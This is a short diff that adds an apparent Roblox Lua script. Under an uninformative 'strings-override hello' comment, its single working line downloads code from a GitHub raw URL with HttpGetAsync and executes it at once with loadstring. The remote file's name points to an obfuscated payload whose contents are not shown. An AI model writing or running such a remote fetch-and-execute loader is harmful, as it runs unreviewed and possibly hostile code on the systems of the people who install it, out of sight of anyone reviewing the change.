@@ -1,0 +1,5 @@
+--[[ 
+strings-override
+hello
+]]
+loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/GoodB0y08/Lua-projects/main/SW/uyit5WcHop.LURAPH.IS.TRASH.PSU%23WINNING"))
